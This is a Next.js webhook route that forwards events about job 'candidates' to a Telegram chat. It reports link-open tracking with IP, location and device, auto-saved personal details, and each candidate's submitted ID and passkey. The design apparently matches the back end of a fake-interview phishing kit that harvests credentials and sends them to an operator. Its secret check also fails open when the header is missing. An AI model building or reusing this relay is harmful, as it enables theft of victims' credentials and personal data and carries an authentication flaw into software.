import { NextRequest, NextResponse } from "next/server";

function escapeHtml(str: string): string {
  if (!str) return "";
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json();

    // 1. Validate Secret if configured
    const secret = req.headers.get("x-webhook-secret");
    const configuredSecret = process.env.TELEGRAM_WEBHOOK_SECRET;
    if (configuredSecret && secret && secret !== configuredSecret) {
      return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
    }

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.warn("Telegram Bot Token or Chat ID not configured in environment variables.");
      return NextResponse.json(
        { message: "Telegram credentials not configured on server, notification skipped" },
        { status: 200 }
      );
    }

    // 2. Determine event type
    const eventType =
      body.type ||
      body.event ||
      (body.table === "schedule_visits"
        ? "schedule_visit"
        : body.table === "bookings"
        ? body.record?.candidate_id
          ? "booking"
          : "candidate_draft"
        : body.record?.session_id
        ? "schedule_visit"
        : "custom");

    const record = body.record || body;

    let messageHtml = "";

    if (eventType === "schedule_visit" || body.table === "schedule_visits") {
      const interviewer = record.interviewer_name || "Default Admin";
      const adminEmail = record.admin_email ? ` (${record.admin_email})` : "";
      const timezone = record.timezone || "Unknown";
      const ip = record.ip_address || "Unknown IP";
      const locParts = [record.city, record.state, record.country].filter(Boolean);
      const location = locParts.length > 0 ? locParts.join(", ") : "Unknown Location";
      const userAgent = record.user_agent
        ? record.user_agent.length > 80
          ? record.user_agent.substring(0, 80) + "..."
          : record.user_agent
        : "Unknown";

      const time = new Date(record.created_at || Date.now()).toLocaleTimeString("en-US", {
        timeZone: "America/New_York",
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
      });

      messageHtml =
        `⚡ <b>Candidate Opened Scheduling Link!</b>\n\n` +
        `👤 <b>Interviewer Link:</b> ${escapeHtml(interviewer)}${escapeHtml(adminEmail)}\n` +
        `📍 <b>Location:</b> ${escapeHtml(location)}\n` +
        `🌐 <b>IP Address:</b> <code>${escapeHtml(ip)}</code>\n` +
        `🕒 <b>Time:</b> ${time} (New York / EST)\n` +
        `🌍 <b>Timezone:</b> <code>${escapeHtml(timezone)}</code>\n` +
        `📱 <b>Device / Browser:</b> <code>${escapeHtml(userAgent)}</code>`;
    } else if (
      eventType === "candidate_draft" ||
      (body.table === "bookings" && !record.candidate_id && !record.passkey)
    ) {
      const candidateName =
        `${record.first_name || ""} ${record.last_name || ""}`.trim() || "Candidate";
      const email = record.email || "N/A";
      const phone = record.phone_number || record.phone || "N/A";
      const date = record.date || record.scheduled_date || "N/A";
      const time = record.start_time || record.scheduled_time || "N/A";
      const interviewer = record.interviewer_name || "Default Admin";
      const adminEmail = record.admin_email ? ` (${record.admin_email})` : "";
      const ip = record.ip_address || "Unknown IP";
      const locParts = [record.city, record.state, record.country].filter(Boolean);
      const location = locParts.length > 0 ? locParts.join(", ") : "Unknown Location";

      messageHtml =
        `📝 <b>Candidate Details Entered (Auto-Saved)!</b>\n\n` +
        `👤 <b>Candidate:</b> ${escapeHtml(candidateName)}\n` +
        `📧 <b>Email:</b> <code>${escapeHtml(email)}</code>\n` +
        `📞 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
        `📍 <b>Location:</b> ${escapeHtml(location)}\n` +
        `🌐 <b>IP Address:</b> <code>${escapeHtml(ip)}</code>\n` +
        `📅 <b>Date & Time:</b> ${escapeHtml(date)} at ${escapeHtml(time)}\n` +
        `👔 <b>Interviewer:</b> ${escapeHtml(interviewer)}${escapeHtml(adminEmail)}\n` +
        `🔒 <b>Status:</b> In ID/Passkey Modal`;
    } else if (
      eventType === "booking" ||
      eventType === "booking_created" ||
      body.table === "bookings"
    ) {
      const candidateName =
        `${record.first_name || ""} ${record.last_name || ""}`.trim() || "Candidate";
      const email = record.email || "N/A";
      const phone = record.phone_number || record.phone || "N/A";
      const date = record.date || record.scheduled_date || "N/A";
      const time = record.start_time || record.scheduled_time || "N/A";
      const interviewer = record.interviewer_name || "Default Admin";
      const adminEmail = record.admin_email ? ` (${record.admin_email})` : "";
      const candidateId = record.candidate_id || "N/A";
      const passkey = record.passkey || "N/A";
      const ip = record.ip_address || "Unknown IP";
      const locParts = [record.city, record.state, record.country].filter(Boolean);
      const location = locParts.length > 0 ? locParts.join(", ") : "Unknown Location";

      messageHtml =
        `🎉 <b>Candidate Submitted ID & Passkey!</b>\n\n` +
        `👤 <b>Candidate:</b> ${escapeHtml(candidateName)}\n` +
        `📧 <b>Email:</b> <code>${escapeHtml(email)}</code>\n` +
        `📞 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
        `🔑 <b>Candidate ID:</b> <code>${escapeHtml(candidateId)}</code>\n` +
        `🏷 <b>Passkey:</b> <code>${escapeHtml(passkey)}</code>\n` +
        `📍 <b>Location:</b> ${escapeHtml(location)}\n` +
        `🌐 <b>IP Address:</b> <code>${escapeHtml(ip)}</code>\n` +
        `📅 <b>Date & Time:</b> ${escapeHtml(date)} at ${escapeHtml(time)}\n` +
        `👔 <b>Interviewer:</b> ${escapeHtml(interviewer)}${escapeHtml(adminEmail)}`;
    } else {
      messageHtml = `🔔 <b>Recruitment Notification:</b>\n<pre>${escapeHtml(
        JSON.stringify(record, null, 2)
      )}</pre>`;
    }

    // 3. Send message via Telegram Bot API
    const telegramRes = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: messageHtml,
          parse_mode: "HTML",
        }),
      }
    );

    const telegramData = await telegramRes.json();

    if (!telegramData.ok) {
      console.error("Telegram API error:", telegramData);
      return NextResponse.json({ error: telegramData.description }, { status: 500 });
    }

    return NextResponse.json({ success: true, message_id: telegramData.result?.message_id });
  } catch (err: any) {
    console.error("Webhook processing error:", err);
    return NextResponse.json({ error: err.message || "Internal Server Error" }, { status: 500 });
  }
}

